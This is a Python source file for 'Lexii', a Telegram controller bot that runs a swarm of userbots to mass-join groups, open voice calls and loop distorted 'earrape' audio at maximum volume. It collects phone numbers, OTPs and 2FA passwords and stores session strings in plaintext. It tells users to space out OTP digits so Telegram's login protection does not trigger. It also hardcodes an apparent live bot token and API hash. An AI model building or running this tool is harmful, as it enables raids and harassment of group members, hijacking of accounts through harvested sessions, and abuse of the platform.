import os
import re
import json
import wave
import random
import asyncio
from typing import Any
from pyrogram import Client, filters, idle
from pyrogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ChatPrivileges
)
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PasswordHashInvalid,
    UserAlreadyParticipant,
    FloodWait
)
from pyrogram.raw.functions.phone import CreateGroupCall

from pytgcalls import PyTgCalls
from pytgcalls.types import MediaStream, AudioQuality
from pytgcalls.exceptions import NoActiveGroupCall

# Safe cross-version import for StreamEnded / StreamAudioEnded
try:
    from pytgcalls.types import StreamAudioEnded as StreamEndEvent
except ImportError:
    try:
        from pytgcalls.types import StreamEnded as StreamEndEvent
    except ImportError:
        StreamEndEvent = None

# ==========================================
# ⚙️ CONFIGURATION (SUPPORTS ENV VARS FOR RAILWAY/RENDER)
# ==========================================
API_ID = int(os.environ.get("API_ID", 35222361))
API_HASH = os.environ.get("API_HASH", "37e25f9cff15259a786c55da0b0af3f3")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8570478868:AAEgOjPS2gCikZu9spLM8PKMJHMHtMNVJzM")
OWNER_ID = int(os.environ.get("OWNER_ID", 8684812026))
PORT = int(os.environ.get("PORT", 8080))

os.makedirs("audios", exist_ok=True)
os.makedirs("sessions", exist_ok=True)
DB_FILE = "lexii_db.json"
SILENT_WAV = "audios/silent.wav"

if not os.path.exists(SILENT_WAV):
    with wave.open(SILENT_WAV, "w") as f:
        f.setnchannels(1)
        f.setsampwidth(2)
        f.setframerate(48000)
        f.writeframes(b"\x00\x00" * 48000 * 2)

# ==========================================
# 🎚️ CUSTOM FFMPEG BASS-BOOST & EARRAPE PRESETS
# ==========================================
MODE_FILTERS = {
    "-xtrem": "-af bass=g=18:f=110:w=0.6,treble=g=8:f=3500,volume=7.0,aecho=0.8:0.9:100:0.5",
    "-flow": "-af bass=g=12:f=100:w=0.5,volume=4.0,aecho=0.8:0.88:60:0.4",
    "-adv": "-af bass=g=14:f=120:w=0.6,treble=g=10:f=3000,volume=5.5,aecho=0.8:0.9:120:0.6",
    "-dynamic": "-af acompressor=threshold=0.05:ratio=9:attack=5:release=50,bass=g=16:f=110:w=0.6,volume=6.0,aecho=0.8:0.88:40:0.4",
    "vl_max": "-af bass=g=22:f=110:w=0.7,treble=g=10:f=3500,volume=10.0,aecho=0.8:0.9:100:0.5"
}

# ==========================================
# 🗄️ DATABASE MANAGEMENT
# ==========================================
def load_db():
    if not os.path.exists(DB_FILE):
        default_data = {
            "admins": [OWNER_ID],
            "public_admin_mode": False,
            "sessions": [],
            "audios": {
                "default": None,
                "-xtrem": None,
                "-flow": None,
                "-adv": None,
                "-dynamic": None
            }
        }
        save_db(default_data)
        return default_data
    with open(DB_FILE, "r") as f:
        return json.load(f)

def save_db(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f, indent=4)

db = load_db()

# Runtime States
USER_STATES = {}
ACTIVE_USERBOTS = []
ACTIVE_LOOPS = {}
PROCESSED_MSGS = set()

def is_authorized(user_id: int) -> bool:
    if db.get("public_admin_mode", False):
        return True
    return user_id == OWNER_ID or user_id in db.get("admins", [])

# ==========================================
# 🔗 GROUP LINK NORMALIZER & SWARM JOINER
# ==========================================
def normalize_chat_target(raw_link: str) -> str:
    target = raw_link.strip()
    if "joinchat/" in target or "t.me/+" in target:
        if not target.startswith("http"):
            target = "https://" + target.lstrip("/")
        return target

    match = re.match(r"^(?:https?://)?t\.me/([a-zA-Z0-9_]+)/?$", target)
    if match:
        return match.group(1)

    return target.lstrip("@")

async def _single_ub_join_group(ub_entry: dict, target: str) -> tuple[bool, str]:
    client: Client = ub_entry["client"]
    try:
        chat = await client.join_chat(target)
        return True, f"✅ `{ub_entry['name']}` joined (`{chat.title}`)"
    except UserAlreadyParticipant:
        return True, f"☑️ `{ub_entry['name']}` already in group"
    except FloodWait as fw:
        await asyncio.sleep(min(fw.value, 15))
        try:
            await client.join_chat(target)
            return True, f"✅ `{ub_entry['name']}` joined (after FloodWait)"
        except Exception as e:
            return False, f"❌ `{ub_entry['name']}`: `{type(e).__name__}`"
    except Exception as e:
        return False, f"❌ `{ub_entry['name']}`: `{type(e).__name__}`"

async def swarm_join_group(raw_link: str) -> tuple[int, list[str]]:
    if not ACTIVE_USERBOTS:
        return 0, ["⚠️ No hosted userbots active! Host a userbot first."]

    target = normalize_chat_target(raw_link)
    results = await asyncio.gather(
        *[_single_ub_join_group(ub, target) for ub in ACTIVE_USERBOTS],
        return_exceptions=True
    )

    success_count = 0
    details = []
    for res in results:
        if isinstance(res, tuple):
            ok, msg = res
            if ok:
                success_count += 1
            details.append(msg)
        else:
            details.append(f"❌ Error: `{res}`")

    return success_count, details


# ==========================================
# 🤖 MAIN CONTROLLER BOT INITIALIZATION
# ==========================================
bot = Client(
    "lexii_controller_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

def get_main_menu():
    pub_status = "🟢 ON" if db.get("public_admin_mode") else "🔴 OFF"
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📤 Upload Audio / VN", callback_data="menu_upload"),
            InlineKeyboardButton("🚀 Host Userbot", callback_data="menu_host")
        ],
        [
            InlineKeyboardButton("🔗 Swarm Join Group", callback_data="menu_join"),
            InlineKeyboardButton("👮 Admin Panel", callback_data="menu_admin")
        ],
        [
            InlineKeyboardButton("👑 Owner Panel", callback_data="menu_owner"),
            InlineKeyboardButton(f"🌐 Everyone Admin: {pub_status}", callback_data="toggle_public_admin")
        ]
    ])

# ==========================================
# 📋 INLINE MENU & CALLBACK HANDLERS
# ==========================================
@bot.on_message(filters.command("start") & filters.private)
async def start_cmd(client: Client, message: Message):
    USER_STATES.pop(message.from_user.id, None)
    await message.reply_text(
        f"🎙 **Welcome to Lexii Multi-Userbot Call Controller!**\n\n"
        f"🤖 **Active Swarm Userbots:** `{len(ACTIVE_USERBOTS)}`\n"
        f"Use the buttons below to host userbots in real-time, auto-join groups, "
        f"upload VNs/call recordings, and manage admin permissions.",
        reply_markup=get_main_menu()
    )

@bot.on_message(filters.private & filters.regex(r"(?i)^join\s+(.+)"))
async def bot_pm_join_cmd(client: Client, message: Message):
    if not is_authorized(message.from_user.id):
        return await message.reply_text("❌ You are not authorized to use this command.")
    
    raw_link = message.matches[0].group(1).strip()
    status_msg = await message.reply_text(f"🐝 **Joining `{len(ACTIVE_USERBOTS)}` Userbot(s) to target group...**")
    joined_count, details = await swarm_join_group(raw_link)
    report = "\n".join(details)
    await status_msg.edit_text(
        f"🔗 **Swarm Auto-Join Report ({joined_count}/{len(ACTIVE_USERBOTS)} Ready)**\n\n"
        f"{report}\n\n"
        f"💡 Now go to the group and type `cll` to start/join the voice call!",
        reply_markup=get_main_menu()
    )

@bot.on_callback_query()
async def callback_handler(client: Client, cb: CallbackQuery):
    user_id = cb.from_user.id
    data = cb.data

    if data == "back_main":
        USER_STATES.pop(user_id, None)
        await cb.message.edit_text(
            f"🎙 **Lexii Call Setup & Swarm Controller**\n"
            f"🤖 **Active Hosted Userbots:** `{len(ACTIVE_USERBOTS)}`",
            reply_markup=get_main_menu()
        )

    elif data == "menu_join":
        if not is_authorized(user_id):
            return await cb.answer("❌ Admins only!", show_alert=True)
        USER_STATES[user_id] = {"action": "awaiting_join_link"}
        await cb.message.edit_text(
            "🔗 **Swarm Auto-Join Group**\n\n"
            "Send the **Group Invite Link** (`https://t.me/+...`) or **Public Username** (`@groupname`).\n"
            "All hosted userbots will immediately join the group together!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="back_main")]])
        )

    elif data == "menu_upload":
        if user_id != OWNER_ID:
            return await cb.answer("❌ Only the Owner can upload audio files!", show_alert=True)
        
        kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("🔥 -xtrem (Earrape+Bass)", callback_data="up_-xtrem"),
                InlineKeyboardButton("🌊 -flow (Deep Bass)", callback_data="up_-flow")
            ],
            [
                InlineKeyboardButton("⚡ -adv (High Reverb)", callback_data="up_-adv"),
                InlineKeyboardButton("🌀 -dynamic (Compressor)", callback_data="up_-dynamic")
            ],
            [
                InlineKeyboardButton("🎵 Set for ALL Modes (Master VN)", callback_data="up_default")
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
        ])
        await cb.message.edit_text(
            "📤 **Upload Audio / VN / Call Recording**\n\n"
            "Select which mode you want to upload the audio for:",
            reply_markup=kb
        )

    elif data.startswith("up_"):
        if user_id != OWNER_ID:
            return await cb.answer("❌ Owner only!", show_alert=True)
        mode = data.replace("up_", "")
        USER_STATES[user_id] = {"action": "upload_audio", "mode": mode}
        await cb.message.edit_text(
            f"🎙 **Send your Voice Note (VN), Audio file, or Call Recording now** for `{mode}`.\n\n"
            "*(Send /start to cancel)*"
        )

    elif data == "menu_host":
        if not is_authorized(user_id):
            return await cb.answer("❌ You are not authorized to host a userbot.", show_alert=True)
        
        USER_STATES[user_id] = {"action": "awaiting_phone"}
        await cb.message.edit_text(
            "📱 **Real-Time Userbot Hoster**\n\n"
            "Step 1/3: Send the **Phone Number** with country code to host the Userbot.\n"
            "Example: `+919876543210`\n\n"
            "*(Send /start to cancel)*",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="back_main")]])
        )

    elif data == "menu_admin":
        if not is_authorized(user_id):
            return await cb.answer("❌ Admins only!", show_alert=True)
        
        admins_list = "\n".join([f"• `{a}`" for a in db["admins"]])
        ub_names = ", ".join([f"`{ub['name']}`" for ub in ACTIVE_USERBOTS]) or "None"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]])
        await cb.message.edit_text(
            f"👮 **Admin Panel**\n\n"
            f"🤖 **Active Userbots ({len(ACTIVE_USERBOTS)}):** {ub_names}\n"
            f"👥 **Authorized Admins:**\n{admins_list}\n\n"
            f"💡 **Swarm Group Commands:**\n"
            f"• `hey lexii` - Wake up bot\n"
            f"• `menu` - Show mode menu\n"
            f"• `join <group_link>` - All userbots join target group at once\n"
            f"• `cll` - All userbots join/start voice call simultaneously\n"
            f"• `-xtrem` | `-flow` | `-adv` | `-dynamic` - All bots blast VN w/ Bass & Earrape\n"
            f"• `pe` (Pause) | `rs` (Resume) | `st` (Stop) | `vl` (10x Earrape Boost)",
            reply_markup=kb
        )

    elif data == "menu_owner":
        if user_id != OWNER_ID:
            return await cb.answer("❌ Only the Owner can access this panel!", show_alert=True)
        
        kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("➕ Add Admin", callback_data="owner_add_admin"),
                InlineKeyboardButton("➖ Remove Admin", callback_data="owner_rem_admin")
            ],
            [
                InlineKeyboardButton("🌐 Toggle Everyone Admin", callback_data="toggle_public_admin")
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
        ])
        await cb.message.edit_text(
            "👑 **Owner Control Panel**\n\n"
            "Manage bot admins or grant admin access to everyone:",
            reply_markup=kb
        )

    elif data == "owner_add_admin":
        if user_id != OWNER_ID:
            return
        USER_STATES[user_id] = {"action": "add_admin"}
        await cb.message.edit_text(
            "➕ **Send the Telegram User ID** of the person you want to make Admin:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="back_main")]])
        )

    elif data == "owner_rem_admin":
        if user_id != OWNER_ID:
            return
        USER_STATES[user_id] = {"action": "rem_admin"}
        await cb.message.edit_text(
            "➖ **Send the Telegram User ID** you want to remove from Admin:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="back_main")]])
        )

    elif data == "toggle_public_admin":
        if user_id != OWNER_ID:
            return await cb.answer("❌ Only the Owner can toggle Everyone Admin mode!", show_alert=True)
        db["public_admin_mode"] = not db.get("public_admin_mode", False)
        save_db(db)
        status = "ENABLED (Everyone can control Lexii)" if db["public_admin_mode"] else "DISABLED (Only Owner/Admins)"
        await cb.answer(f"Everyone Admin Mode: {status}", show_alert=True)
        await cb.message.edit_reply_markup(reply_markup=get_main_menu())


# ==========================================
# 🔐 REAL-TIME OTP, 2FA, UPLOAD & JOIN INPUT HANDLER
# ==========================================
@bot.on_message(filters.private & ~filters.command("start") & ~filters.regex(r"(?i)^join\s+(.+)"))
async def handle_private_inputs(client: Client, message: Message):
    user_id = message.from_user.id
    if user_id not in USER_STATES:
        return

    state = USER_STATES[user_id]
    action = state.get("action")

    if action == "awaiting_join_link":
        if not message.text:
            return await message.reply_text("❌ Please send a valid group invite link or @username.")
        raw_link = message.text.strip()
        USER_STATES.pop(user_id, None)
        status_msg = await message.reply_text(f"🐝 **Joining `{len(ACTIVE_USERBOTS)}` Userbot(s) to `{raw_link}`...**")
        joined_count, details = await swarm_join_group(raw_link)
        report = "\n".join(details)
        await status_msg.edit_text(
            f"🔗 **Swarm Auto-Join Report ({joined_count}/{len(ACTIVE_USERBOTS)} Ready)**\n\n"
            f"{report}\n\n"
            f"💡 Go to the group and type `cll` to start/join the call!",
            reply_markup=get_main_menu()
        )

    elif action == "upload_audio":
        media = message.audio or message.voice or message.document
        if not media:
            return await message.reply_text("❌ Please send a valid Voice Note (VN) or Audio file!")
        
        mode = state["mode"]
        status_msg = await message.reply_text("⏳ **Downloading audio to server...**")
        file_ext = ".ogg" if message.voice else ".mp3"
        save_path = os.path.abspath(f"audios/audio_{mode}{file_ext}")
        
        await message.download(file_name=save_path)
        
        if mode == "default":
            for k in db["audios"]:
                db["audios"][k] = save_path
        else:
            db["audios"][mode] = save_path
            if not db["audios"]["default"]:
                db["audios"]["default"] = save_path
        
        save_db(db)
        USER_STATES.pop(user_id, None)
        await status_msg.edit_text(
            f"✅ **Audio successfully uploaded and linked to `{mode}`!**\n"
            f"All hosted userbots will blast this on loop with Bass-Boost & Echo when triggered.",
            reply_markup=get_main_menu()
        )

    elif action == "add_admin":
        try:
            target_id = int(message.text.strip())
            if target_id not in db["admins"]:
                db["admins"].append(target_id)
                save_db(db)
            USER_STATES.pop(user_id, None)
            await message.reply_text(f"✅ User `{target_id}` added as Admin!", reply_markup=get_main_menu())
        except ValueError:
            await message.reply_text("❌ Invalid User ID. Please send numbers only.")

    elif action == "rem_admin":
        try:
            target_id = int(message.text.strip())
            if target_id in db["admins"] and target_id != OWNER_ID:
                db["admins"].remove(target_id)
                save_db(db)
            USER_STATES.pop(user_id, None)
            await message.reply_text(f"✅ User `{target_id}` removed from Admins!", reply_markup=get_main_menu())
        except ValueError:
            await message.reply_text("❌ Invalid User ID.")

    elif action == "awaiting_phone":
        if not message.text:
            return await message.reply_text("❌ Please send a valid phone number in text format.")
        phone = message.text.strip().replace(" ", "")
        status_msg = await message.reply_text("🔄 **Connecting to Telegram & requesting real-time OTP...**")
        
        temp_client = Client(
            f"temp_{user_id}_{random.randint(1000,9999)}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True
        )
        try:
            await temp_client.connect()
            sent_code = await temp_client.send_code(phone)
            USER_STATES[user_id] = {
                "action": "awaiting_otp",
                "phone": phone,
                "code_hash": sent_code.phone_code_hash,
                "client": temp_client
            }
            await status_msg.edit_text(
                "📩 **OTP Sent!**\n\n"
                "Step 2/3: Please enter the OTP you received **with spaces between numbers** "
                "(e.g., `1 2 3 4 5`) so Telegram doesn't block the login:"
            )
        except Exception as e:
            try:
                await temp_client.disconnect()
            except Exception:
                pass
            USER_STATES.pop(user_id, None)
            await status_msg.edit_text(f"❌ **Error sending OTP:** `{e}`", reply_markup=get_main_menu())

    elif action == "awaiting_otp":
        if not message.text:
            return await message.reply_text("❌ Please send the OTP digits.")
        # Strip spaces, dashes, or non-digits so "1 2 3 4 5" -> "12345"
        otp = re.sub(r"\D", "", message.text.strip())
        temp_client: Client = state["client"]
        phone = state["phone"]
        code_hash = state["code_hash"]

        try:
            await temp_client.sign_in(phone_number=phone, phone_code_hash=code_hash, phone_code=otp)
            await finalize_userbot_host(user_id, temp_client, message)

        except SessionPasswordNeeded:
            USER_STATES[user_id]["action"] = "awaiting_2fa"
            await message.reply_text(
                "🔐 **Two-Step Verification (2FA) Detected!**\n\n"
                "Step 3/3: Please send your **2FA Cloud Password** to finish hosting:"
            )
        except (PhoneCodeInvalid, PhoneCodeExpired) as e:
            await message.reply_text(f"❌ **Invalid or expired OTP:** `{e}`\nPlease check and enter it again:")
        except Exception as e:
            try:
                await temp_client.disconnect()
            except Exception:
                pass
            USER_STATES.pop(user_id, None)
            await message.reply_text(f"❌ **Login Failed:** `{e}`", reply_markup=get_main_menu())

    elif action == "awaiting_2fa":
        if not message.text:
            return await message.reply_text("❌ Please send your 2FA password as text.")
        password = message.text.strip()
        temp_client: Client = state["client"]
        try:
            await temp_client.check_password(password=password)
            await finalize_userbot_host(user_id, temp_client, message)
        except PasswordHashInvalid:
            await message.reply_text("❌ **Incorrect 2FA Password!** Please try again:")
        except Exception as e:
            try:
                await temp_client.disconnect()
            except Exception:
                pass
            USER_STATES.pop(user_id, None)
            await message.reply_text(f"❌ **Login Failed:** `{e}`", reply_markup=get_main_menu())


async def finalize_userbot_host(user_id: int, temp_client: Client, message: Message):
    """Exports session string, disconnects temp login client, and boots live Userbot + PyTgCalls."""
    try:
        string_session = await temp_client.export_session_string()
        me = await temp_client.get_me()
    finally:
        try:
            await temp_client.disconnect()
        except Exception:
            pass

    USER_STATES.pop(user_id, None)

    # Give Telegram 1 second to release the temp connection before opening the main userbot session
    await asyncio.sleep(1.0)

    status_msg = await message.reply_text(f"🚀 **Booting Lexii Userbot on `{me.first_name}` (`{me.id}`)...**")
    
    try:
        await start_single_userbot(string_session)
        if string_session not in db["sessions"]:
            db["sessions"].append(string_session)
            save_db(db)

        await status_msg.edit_text(
            f"✅ **Lexii Userbot is now LIVE on `{me.first_name}` (`{me.id}`)!**\n"
            f"🤖 **Total Swarm Size:** `{len(ACTIVE_USERBOTS)}` Userbot(s)\n\n"
            f"🔹 Type `hey lexii` or `menu` in **any group** (even from the hosted account itself!)\n"
            f"🔹 Use `join <group_link>` to bring all bots into a group.",
            reply_markup=get_main_menu()
        )
    except Exception as e:
        await status_msg.edit_text(
            f"❌ **Failed to boot userbot:** `{type(e).__name__}: {e}`\n\n"
            "Please try hosting again.",
            reply_markup=get_main_menu()
        )


# ==========================================
# 🐝 MULTI-USERBOT SWARM CALL HELPERS
# ==========================================
async def _single_join_standby(ub_entry: dict, chat_id: int) -> bool:
    call_py: PyTgCalls = ub_entry["call"]
    try:
        await call_py.play(
            chat_id,
            MediaStream(SILENT_WAV, audio_parameters=AudioQuality.HIGH)
        )
        return True
    except Exception as e:
        print(f"⚠️ [{ub_entry['name']}] Standby Join Error: {e}")
        return False

async def swarm_join_or_create_call(chat_id: int) -> int:
    if not ACTIVE_USERBOTS:
        return 0

    first_ub = ACTIVE_USERBOTS[0]
    call_active = True
    try:
        await first_ub["call"].play(
            chat_id,
            MediaStream(SILENT_WAV, audio_parameters=AudioQuality.HIGH)
        )
    except NoActiveGroupCall:
        call_active = False
    except Exception:
        pass

    if not call_active:
        for ub_entry in ACTIVE_USERBOTS:
            try:
                peer = await ub_entry["client"].resolve_peer(chat_id)
                await ub_entry["client"].invoke(
                    CreateGroupCall(
                        peer=peer,
                        random_id=random.randint(10000, 999999999)
                    )
                )
                await asyncio.sleep(1.5)
                break
            except Exception:
                continue

    results = await asyncio.gather(
        *[_single_join_standby(ub, chat_id) for ub in ACTIVE_USERBOTS],
        return_exceptions=True
    )
    return sum(1 for r in results if r is True)


async def _single_blast_audio(ub_entry: dict, chat_id: int, audio_file: str, ffmpeg_args: str) -> bool:
    call_py: PyTgCalls = ub_entry["call"]
    try:
        await call_py.play(
            chat_id,
            MediaStream(
                audio_file,
                audio_parameters=AudioQuality.HIGH,
                ffmpeg_parameters=ffmpeg_args
            )
        )
        try:
            await call_py.change_volume_call(chat_id, 200)
        except Exception:
            pass
        return True
    except Exception as e:
        print(f"⚠️ [{ub_entry['name']}] Blast Audio Error: {e}")
        return False

async def swarm_blast_audio(chat_id: int, audio_file: str, ffmpeg_args: str) -> int:
    results = await asyncio.gather(
        *[_single_blast_audio(ub, chat_id, audio_file, ffmpeg_args) for ub in ACTIVE_USERBOTS],
        return_exceptions=True
    )
    return sum(1 for r in results if r is True)


async def swarm_control_action(chat_id: int, action: str):
    async def _run_on_ub(ub_entry: dict):
        call_py: PyTgCalls = ub_entry["call"]
        try:
            if action == "pe":
                await call_py.pause_stream(chat_id)
            elif action == "rs":
                await call_py.resume_stream(chat_id)
            elif action == "st":
                await call_py.leave_call(chat_id)
            elif action == "vl":
                await call_py.change_volume_call(chat_id, 200)
                if chat_id in ACTIVE_LOOPS:
                    await call_py.play(
                        chat_id,
                        MediaStream(
                            ACTIVE_LOOPS[chat_id]["file"],
                            audio_parameters=AudioQuality.HIGH,
                            ffmpeg_parameters=MODE_FILTERS["vl_max"]
                        )
                    )
        except Exception:
            pass

    await asyncio.gather(*[_run_on_ub(ub) for ub in ACTIVE_USERBOTS], return_exceptions=True)


# ==========================================
# 🎧 USERBOT REGISTRATION & EVENT LOOP
# ==========================================
async def start_single_userbot(session_str: str):
    # in_memory=True prevents SQLite file locks when hosting multiple userbots dynamically
    ub = Client(
        f"lexii_ub_{random.randint(10000, 99999)}",
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_str,
        in_memory=True
    )
    call_py = PyTgCalls(ub)

    # 🛠️ FIXED: Removed undefined `Update` type-hint that crashed userbot startup!
    @call_py.on_update()
    async def on_stream_end(client: PyTgCalls, update: Any):
        is_ended = (StreamEndEvent and isinstance(update, StreamEndEvent)) or (
            type(update).__name__ in ("StreamAudioEnded", "StreamEnded")
        )
        if is_ended:
            chat_id = getattr(update, "chat_id", None)
            if not chat_id:
                return
            loop_info = ACTIVE_LOOPS.get(chat_id)
            if loop_info and loop_info.get("loop"):
                try:
                    await client.play(
                        chat_id,
                        MediaStream(
                            loop_info["file"],
                            audio_parameters=AudioQuality.HIGH,
                            ffmpeg_parameters=loop_info["ffmpeg"]
                        )
                    )
                    await client.change_volume_call(chat_id, 200)
                except Exception:
                    pass

    @ub.on_message(filters.text & ~filters.private)
    async def lexii_group_commands(client: Client, message: Message):
        # Allow Owner, Admins, OR the hosted Userbot account itself (message.outgoing)
        sender_id = message.from_user.id if message.from_user else 0
        if not (message.outgoing or is_authorized(sender_id)):
            return

        msg_key = (message.chat.id, message.id)
        if msg_key in PROCESSED_MSGS:
            return
        PROCESSED_MSGS.add(msg_key)
        if len(PROCESSED_MSGS) > 2000:
            PROCESSED_MSGS.clear()

        raw_text = message.text.strip()
        text = raw_text.lower()
        chat_id = message.chat.id

        if text == "hey lexii":
            await message.reply_text("yess dear how can i help you??")

        elif text == "menu":
            menu_text = (
                "🎛 **LEXII SWARM USERBOT MENU**\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "🔥 `-xtrem` (Earrape + +18dB Bass + Echo)\n"
                "🌊 `-flow` (Deep Sub-Bass + Wide Echo)\n"
                "⚡ `-adv` (Loudness Boost + Reverb Echo)\n"
                "🌀 `-dynamic` (Dynamic Compressor + Bass)\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "🔗 **Swarm Group Join:** `join <group_link>`\n"
                f"🐝 **Swarm Call Join (`{len(ACTIVE_USERBOTS)}` Bots):** `cll`\n"
                "🎛 **Controls:** `pe` (Pause) | `rs` (Resume) | `st` (Stop) | `vl` (10x Earrape)\n"
                "👑 **Admin:** `admin all` (Give Everyone Admin)"
            )
            await message.reply_text(menu_text)

        elif text.startswith("join "):
            target_link = raw_text.split(maxsplit=1)[1].strip()
            status_msg = await message.reply_text(
                f"🐝 **Swarm Joining `{len(ACTIVE_USERBOTS)}` Userbot(s) to target group...**"
            )
            joined_count, details = await swarm_join_group(target_link)
            report = "\n".join(details)
            await status_msg.edit_text(
                f"🔗 **Swarm Auto-Join Complete ({joined_count}/{len(ACTIVE_USERBOTS)} Ready)**\n\n"
                f"{report}\n\n"
                f"✅ Type `cll` in the target group to launch the voice call!"
            )

        elif text == "cll":
            joined_count = await swarm_join_or_create_call(chat_id)
            if joined_count > 0:
                await message.reply_text(f"next what can i do\n*(🐝 `{joined_count}` Userbot(s) joined the call)*")
            else:
                await message.reply_text(
                    "❌ **Cannot start or join call!** Make sure a voice call is open or at least one Userbot has 'Manage Video Chats' admin permission."
                )

        elif text in ["-xtrem", "-xtream", "-flow", "-adv", "-dynamic"]:
            mode_key = "-xtrem" if text == "-xtream" else text
            audio_file = db["audios"].get(mode_key) or db["audios"].get("default")

            if not audio_file or not os.path.exists(audio_file):
                return await message.reply_text(
                    "⚠️ **No audio/VN uploaded yet!** Please upload an audio file in the Controller Bot first."
                )

            ffmpeg_args = MODE_FILTERS.get(mode_key, MODE_FILTERS["-xtrem"])
            ACTIVE_LOOPS[chat_id] = {
                "file": audio_file,
                "ffmpeg": ffmpeg_args,
                "loop": True
            }

            blasting_count = await swarm_blast_audio(chat_id, audio_file, ffmpeg_args)
            if blasting_count > 0:
                await message.reply_text(
                    f"🔊 **Swarm Blasting `{mode_key}` Mode!**\n"
                    f"🐝 **Active Userbots in Call:** `{blasting_count}`\n"
                    f"♾ **Loop:** Continuous Infinite Loop\n"
                    f"🎚 **Preset:** Bass-Boost + Echo + Full Volume (200%)\n"
                    f"Use `pe` to pause, `st` to stop, or `vl` for 10x Earrape."
                )
            else:
                await message.reply_text("❌ **Failed to play audio in call! Type `cll` first.**")

        elif text == "pe":
            await swarm_control_action(chat_id, "pe")
            await message.reply_text("⏸ **All Userbots Paused.** (Say `rs` to resume)")

        elif text == "rs":
            await swarm_control_action(chat_id, "rs")
            await message.reply_text("▶️ **All Userbots Resumed!**")

        elif text == "st":
            if chat_id in ACTIVE_LOOPS:
                ACTIVE_LOOPS[chat_id]["loop"] = False
                ACTIVE_LOOPS.pop(chat_id, None)
            await swarm_control_action(chat_id, "st")
            await message.reply_text("⏹ **Stopped VN loop and all Userbots left the voice call.**")

        elif text == "vl":
            if chat_id in ACTIVE_LOOPS:
                ACTIVE_LOOPS[chat_id]["ffmpeg"] = MODE_FILTERS["vl_max"]
            await swarm_control_action(chat_id, "vl")
            await message.reply_text("🔊 **MAXIMUM OVERDRIVE ACTIVATED (+22dB Bass + 10x Earrape Gain + 200% Call Vol)!**")

        elif text == "admin all" and (sender_id == OWNER_ID or message.outgoing):
            db["public_admin_mode"] = True
            save_db(db)
            await message.reply_text("👑 **Owner granted Lexii Admin access to EVERYONE in the group!**")

            promoted = 0
            try:
                async for member in client.get_chat_members(chat_id):
                    if not member.user.is_bot and member.status.name == "MEMBER":
                        try:
                            await client.promote_chat_member(
                                chat_id,
                                member.user.id,
                                privileges=ChatPrivileges(
                                    can_manage_chat=True,
                                    can_manage_video_chats=True,
                                    can_invite_users=True
                                )
                            )
                            promoted += 1
                            await asyncio.sleep(0.5)
                        except Exception:
                            pass
                if promoted > 0:
                    await message.reply_text(f"✅ **Promoted `{promoted}` members to Group Admin!**")
            except Exception:
                pass

    # 🛠️ FIXED: Safe startup sequence so ub and call_py never clash
    if not ub.is_connected:
        await ub.start()
    await call_py.start()

    me = await ub.get_me()

    # Auto-add the hosted Userbot account ID to admins so you can type commands from that account too!
    if me.id not in db["admins"]:
        db["admins"].append(me.id)
        save_db(db)

    # Warm up dialog peers in background so the userbot immediately receives group events
    async def _warm_dialogs():
        try:
            async for _ in ub.get_dialogs(limit=50):
                pass
        except Exception:
            pass
    asyncio.create_task(_warm_dialogs())

    # Replace existing entry if same account was re-hosted
    ACTIVE_USERBOTS[:] = [u for u in ACTIVE_USERBOTS if u["id"] != me.id]
    ACTIVE_USERBOTS.append({
        "client": ub,
        "call": call_py,
        "id": me.id,
        "name": me.first_name
    })
    print(f"✅ Userbot `{me.first_name}` ({me.id}) is online and listening!")


# ==========================================
# 🌐 DUMMY HTTP HEALTH-CHECK SERVER (FOR RENDER / RAILWAY)
# ==========================================
async def handle_health_check(reader, writer):
    await reader.read(1024)
    response = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/plain\r\n"
        "Content-Length: 28\r\n"
        "Connection: close\r\n\r\n"
        "Lexii Swarm System is Alive!"
    )
    writer.write(response.encode("utf-8"))
    await writer.drain()
    writer.close()

async def start_health_server():
    server = await asyncio.start_server(handle_health_check, "0.0.0.0", PORT)
    print(f"🌐 Health-check server listening on port {PORT}")
    async with server:
        await server.serve_forever()


# ==========================================
# 🚀 MAIN RUNNER
# ==========================================
async def main():
    asyncio.create_task(start_health_server())

    print("🔄 Starting Controller Bot...")
    await bot.start()
    
    print(f"🔄 Loading {len(db['sessions'])} saved Userbot session(s)...")
    valid_sessions = []
    for session_str in db["sessions"]:
        try:
            await start_single_userbot(session_str)
            valid_sessions.append(session_str)
        except Exception as e:
            print(f"⚠️ Removing dead/revoked session: {e}")

    if len(valid_sessions) != len(db["sessions"]):
        db["sessions"] = valid_sessions
        save_db(db)

    print(f"✅ Lexii Swarm System is Fully Online with {len(ACTIVE_USERBOTS)} Userbot(s)!")
    await idle()
    await bot.stop()

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
